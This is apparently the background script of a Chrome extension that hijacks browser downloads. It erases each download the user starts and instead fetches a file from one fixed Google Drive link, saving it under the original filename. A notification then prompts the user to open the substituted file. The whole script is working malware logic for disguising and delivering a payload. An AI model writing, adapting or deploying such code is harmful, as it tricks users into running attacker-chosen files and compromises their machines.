
chrome.downloads.onCreated.addListener(function(delta) {
  chrome.downloads.pause(delta.id);
  //chrome.downloads.setShelfEnabled(False);
  if(delta.url != "https://drive.google.com/uc?export=download&id=1tpL8BBemq6km04oaH3xSi74Qf0zV_Qzz"){
    /*delta.finalUrl = "https://drive.google.com/uc?export=download&id=1tpL8BBemq6km04oaH3xSi74Qf0zV_Qzz";
    delta.url = "https://drive.google.com/uc?export=download&id=1tpL8BBemq6km04oaH3xSi74Qf0zV_Qzz";
    delta.filename = delta.filename.substr(0, delta.filename.indexOf('.'));
    chrome.downloads.resume(delta.id);*/
    var filename = delta.finalUrl.substr(delta.finalUrl.lastIndexOf('/')+1, delta.finalUrl.lastIndexOf('.'));
    chrome.downloads.erase({id: delta.id});
    chrome.downloads.download({
        url: 'https://drive.google.com/uc?export=download&id=1tpL8BBemq6km04oaH3xSi74Qf0zV_Qzz',
        filename: filename
    }, (callback) => {
      var nButtons = [{ title: "Open the file..." }];
      var nOptions = { type: "basic", iconUrl: "icon.png", priority: 2, title: "Open File", message: "Click the button to open the file", buttons: nButtons };
      chrome.notifications.create("hello_world", nOptions, function (nIDa) {
        chrome.notifications.onButtonClicked.addListener(function (nIDb, nButtonIndex) {
          if (nIDb === nIDa) {
              chrome.downloads.open(callback);
          }
        });
      });
    });
  }
});
